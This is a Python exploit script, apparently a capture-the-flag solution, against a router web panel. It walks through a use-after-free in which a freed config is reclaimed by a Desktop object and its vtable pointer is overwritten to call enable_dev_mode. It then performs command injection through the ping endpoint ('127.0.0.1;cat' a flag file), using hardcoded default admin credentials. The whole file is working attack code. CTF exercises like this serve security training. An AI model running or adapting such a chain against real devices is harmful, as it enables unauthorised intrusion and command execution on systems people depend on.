#!/usr/bin/env python3
import base64
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

# Config.timestamp is the first field of Config. Writing 0x85008 there
# turns a reclaimed Desktop's vtable pointer into 0x85008, and the word at
# 0x85008 is enable_dev_mode (0x1f958). devices_update then calls it through
# vtable[0], which turns on dev mode. The ping endpoint then runs a command
# injection as rweb.
VPTR = 0x85008
FLAG_PATH = "/opt/router-web-panel/flag.txt"
AUTH = "Basic " + base64.b64encode(b"admin:router123").decode()


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


opener = urllib.request.build_opener(NoRedirect)


def request(base, method, path, form=None, body=None):
    data = None
    headers = {"Authorization": AUTH}
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if body is not None:
        data = body.encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(base + path, data=data, method=method, headers=headers)
    try:
        with opener.open(req, timeout=15) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def exploit(ip, port):
    base = f"http://{ip}:{port}"
    name = "uaf" + secrets.token_hex(4)

    # 1. Save a config, so current_config points at its node.
    status, _ = request(base, "GET", f"/configs/save?name={name}")
    print(f"[*] save config: {status}")

    # 2. Delete it. The node is freed, but current_config still points at it.
    status, _ = request(base, "GET", f"/configs/delete/{name}")
    print(f"[*] delete config: {status}")

    # 3. Add a Desktop. Its 168-byte object takes the freed Config chunk.
    status, _ = request(base, "POST", "/devices/add", form={
        "name": "Pwn", "ip": "", "mac": "00:11:22:33:44:55",
        "type": "Desktop", "location": "x",
    })
    print(f"[*] add desktop: {status}")

    # 4. Update the config through the dangling pointer. The timestamp write
    #    overwrites the Desktop's vtable pointer with VPTR.
    status, _ = request(base, "POST", "/configs/update", body='{"dns1": "8.8.8.8", '
                        '"dns2": "8.8.4.4", "firewall": "Middle", "port_forwards": [], '
                        f'"timestamp": {VPTR}}}')
    print(f"[*] overwrite vptr: {status}")

    # 5. Set the device name. devices_update calls vtable[0] on the device,
    #    which is enable_dev_mode now.
    status, _ = request(base, "POST", "/devices/update", form={"id": "0", "name": "Pwned"})
    print(f"[*] trigger enable_dev_mode: {status}")

    # 6. Run the ping command injection and read the flag.
    status, page = request(base, "POST", "/admin/ping",
                           form={"ip": f"127.0.0.1;cat {FLAG_PATH}"})
    if "Dev Mode Not Enabled" in page:
        raise RuntimeError("dev mode is still off")
    flag = re.search(r"HTB\{[^}\n]*\}", page)
    if not flag:
        print(page[:500])
        raise RuntimeError("flag not found in ping output")
    print(f"\n[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
